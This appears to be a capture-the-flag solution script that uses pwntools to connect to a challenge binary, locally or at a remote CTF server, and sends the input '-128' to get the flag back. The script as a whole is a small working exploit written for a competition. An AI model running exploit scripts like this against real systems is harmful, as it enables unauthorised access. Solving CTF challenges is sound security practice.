#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("tjc.tf", 31601)

    return r


def main():
    r = conn()

    r.sendlineafter(b'Input: ', b'-128')
    flag = r.recvlineS()
    log.warn(f'Flag obtained: {flag}')


if __name__ == "__main__":
    main()
